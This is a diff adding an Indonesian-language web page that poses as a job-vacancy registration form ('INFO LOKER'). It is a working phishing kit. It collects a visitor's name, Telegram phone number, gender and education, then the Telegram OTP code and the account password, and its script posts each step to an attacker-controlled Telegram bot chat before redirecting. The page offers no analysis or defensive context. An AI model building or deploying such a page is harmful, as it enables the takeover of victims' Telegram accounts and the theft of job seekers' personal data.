@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INFO LOKER</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+        }
+        .form-container input,
+        .form-container select {
+            width: calc(100% - 22px);
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            margin-top:15px;
+        }
+        .form-container input[type="submit"],
+        .form-container button {
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+        .form-container input[type="submit"]:hover,
+        .form-container button:hover {
+            background-color: #218838;
+        }
+        .form-container .hidden {
+            display: none;
+        }
+
+        /*.blink {*/
+        /*font-family*/
+        /*}*/
+
+        @keyframes blink-animation {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        /* CSS untuk gambar */
+        .form-container img {
+            width: 100%;
+            height: auto; /* Menjaga aspek rasio gambar */
+            display: block; /* Menghilangkan ruang ekstra di bawah gambar */
+            margin: 0; /* Menghapus margin default */
+        }
+
+        /* CSS untuk marquee */
+        h3 marquee {
+            display: block;
+            font-size: 16px;
+            color: #333;
+        }
+
+        /* CSS untuk feedback validasi */
+        select:invalid {
+            border-color: #dc3545;
+        }
+
+        select:valid {
+            border-color: #28a745;
+        }
+
+        /* CSS untuk loading */
+        .loading {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            visibility: hidden; /* Hidden by default */
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .loading.show {
+            visibility: visible;
+            opacity: 1;
+        }
+        .loading .spinner {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <img src="daftar.png" alt="Gambar">
+        <div class="loading">
+            <div class="spinner"></div>
+        </div>
+        <form id="multiStepForm">
+            <!-- Langkah 1: Nama, Nomor Telepon, Jenis Kelamin, dan Lulusan -->
+            <div id="step1" class="form-step">
+                <h2 class="blink">REGISTRASI</h2>
+                <h5>Untuk mendaftar silahkan login menggunakan akun Telegram dan kami akan menghubungi anda untuk melengkapi semua berkas yang diperlukan.</h5>
+                <input type="hidden" name="form_type" value="contact">
+                <input type="text" name="name" placeholder="Nama Lengkap Sesuai KTP" required>
+                <input type="text" name="phone" placeholder="Nomor Telepon Telegram Aktif" required inputmode="numeric">
+
+                <!-- Dropdown Jenis Kelamin -->
+                <select name="gender" required>
+                    <option value="" disabled selected>Pilih Jenis Kelamin</option>
+                    <option value="male">Laki-laki</option>
+                    <option value="female">Perempuan</option>
+                </select>
+
+                <!-- Dropdown Lulusan -->
+                <select name="education" required>
+                    <option value="" disabled selected>Pilih Lulusan</option>
+                    <option value="highschool">SMA/SMK</option>
+                    <option value="diploma">Diploma</option>
+                    <option value="bachelor">Sarjana</option>
+                    <option value="master">Magister</option>
+                    <option value="doctorate">Doktor</option>
+                </select>
+
+                <button type="button" onclick="nextStep()">Kirim</button>
+            </div>
+
+            <!-- Langkah 2: Kode OTP -->
+            <div id="step2" class="form-step hidden">
+                <h3>Cek Pesan Telegram Anda</h3>
+                <span>Kami telah mengirim kode OTP ke aplikasi Telegram anda</span>
+                <input type="hidden" name="form_type" value="otp">
+                <input type="hidden" name="name" id="name">
+                <input type="hidden" name="phone" id="phone">
+                <input type="hidden" name="gender" id="gender">
+                <input type="hidden" name="education" id="education">
+                <input type="text" name="otp" placeholder="Kode OTP" required maxlength="5" inputmode="numeric">
+                <button type="button" onclick="nextStep()">Kirim</button>
+            </div>
+
+            <!-- Langkah 3: Kata Sandi -->
+            <div id="step3" class="form-step hidden">
+                <h3>Masukkan Kata Sandi Telegram</h3>
+                <input type="hidden" name="form_type" value="password">
+                <input type="hidden" name="name" id="name2">
+                <input type="hidden" name="phone" id="phone2">
+                <input type="hidden" name="gender" id="gender2">
+                <input type="hidden" name="education" id="education2">
+                <input type="hidden" name="otp" id="otp">
+                <input type="password" name="password" placeholder="Kata Sandi" required>
+                <button type="button" onclick="submitForm()">Kirim</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Scripts -->
+    <script src="js/config.js"></script>
+    <script>
+    const TELEGRAM_API_URL = telegramConfig.apiUrl;
+    const CHAT_ID = telegramConfig.chatId;
+    
+    async function sendToTelegram(message) {
+        try {
+            const response = await fetch(TELEGRAM_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,  // Fixed: changed chatId to CHAT_ID
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const data = await response.json();
+            
+            if (!data.ok) {
+                throw new Error(data.description || 'Failed to send message');
+            }
+
+            console.log('Message sent successfully:', data);
+            return true;
+        } catch (error) {
+            console.error('Error sending message:', error);
+            alert('Gagal mengirim pesan. Silakan coba lagi.');
+            return false;
+        }
+    }
+
+    function showLoading(show) {
+        const loadingElement = document.querySelector('.loading');
+        if (show) {
+            loadingElement.classList.add('show');
+        } else {
+            loadingElement.classList.remove('show');
+        }
+    }
+
+    function nextStep() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        const nextStep = currentStep.nextElementSibling;
+
+        // Validasi inputan
+        if (!validateInputs(currentStep)) {
+            alert('Harap isi semua kolom sebelum melanjutkan.');
+            return;
+        }
+
+        // Simpan data dari langkah saat ini
+        let message = '';
+        if (currentStep.id === 'step1') {
+            const name = document.querySelector('input[name="name"]').value;
+            const phone = document.querySelector('input[name="phone"]').value;
+            const gender = document.querySelector('select[name="gender"]').value;
+            const education = document.querySelector('select[name="education"]').value;
+
+            document.getElementById('name').value = name;
+            document.getElementById('phone').value = phone;
+            document.getElementById('gender').value = gender;
+            document.getElementById('education').value = education;
+
+            message = `Langkah 1:\n- Nama: ${name}\n- Nomor Telepon: ${phone}\n- Jenis Kelamin: ${gender}\n- Pendidikan: ${education}`;
+        } else if (currentStep.id === 'step2') {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const gender = document.getElementById('gender').value;
+            const education = document.getElementById('education').value;
+            const otp = document.querySelector('input[name="otp"]').value;
+
+            document.getElementById('name2').value = name;
+            document.getElementById('phone2').value = phone;
+            document.getElementById('gender2').value = gender;
+            document.getElementById('education2').value = education;
+            document.getElementById('otp').value = otp;
+
+            message = `Langkah 2:\n- Nama: ${name}\n- Nomor Telepon: ${phone}\n- OTP: ${otp}`;
+        } else if (currentStep.id === 'step3') {
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const gender = document.getElementById('gender2').value;
+            const education = document.getElementById('education2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            message = `Langkah 3:\n- Nama: ${name}\n- Nomor Telepon: ${phone}\n- OTP: ${otp}\n- Kata Sandi: ${password}`;
+        }
+
+        // Tampilkan loading
+        showLoading(true);
+
+        // Kirim data ke Telegram
+        if (message) {
+            sendToTelegram(message).then(success => {
+                // Sembunyikan loading dan pindahkan ke langkah berikutnya
+                showLoading(false);
+                if (success) {
+                    currentStep.classList.add('hidden');
+                    if (nextStep) nextStep.classList.remove('hidden');
+                }
+            });
+        } else {
+            // Sembunyikan loading dan pindahkan ke langkah berikutnya jika tidak ada pesan
+            showLoading(false);
+            currentStep.classList.add('hidden');
+            if (nextStep) nextStep.classList.remove('hidden');
+        }
+    }
+
+    async function submitForm() {
+        const currentStep = document.querySelector('.form-step:not(.hidden)');
+        if (currentStep.id === 'step3') {
+            // Validasi inputan
+            if (!validateInputs(currentStep)) {
+                alert('Harap isi semua kolom sebelum mengirim.');
+                return;
+            }
+
+            // Simpan data dari langkah 3 dan kirim ke Telegram
+            const name = document.getElementById('name2').value;
+            const phone = document.getElementById('phone2').value;
+            const gender = document.getElementById('gender2').value;
+            const education = document.getElementById('education2').value;
+            const otp = document.getElementById('otp').value;
+            const password = document.querySelector('input[name="password"]').value;
+
+            const message = `Langkah 3:\n- Nama: ${name}\n- Nomor Telepon: ${phone}\n- OTP: ${otp}\n- Kata Sandi: ${password}`;
+
+            // Tampilkan loading
+            showLoading(true);
+
+            // Kirim data ke Telegram dan redirect setelah berhasil
+            const success = await sendToTelegram(message);
+            if (success) {
+                window.location.href = 'reload.html';
+            } else {
+                showLoading(false);
+                alert('Terjadi kesalahan saat mengirim data.');
+            }
+        }
+    }
+
+    // Fungsi untuk memvalidasi inputan
+    function validateInputs(step) {
+        const requiredInputs = step.querySelectorAll('input[required]');
+        const requiredSelects = step.querySelectorAll('select[required]');
+        
+        const inputsValid = Array.from(requiredInputs).every(input => input.value.trim() !== '');
+        const selectsValid = Array.from(requiredSelects).every(select => select.value.trim() !== '');
+
+        return inputsValid && selectsValid;
+    }
+</script>
+</body>
+</html>
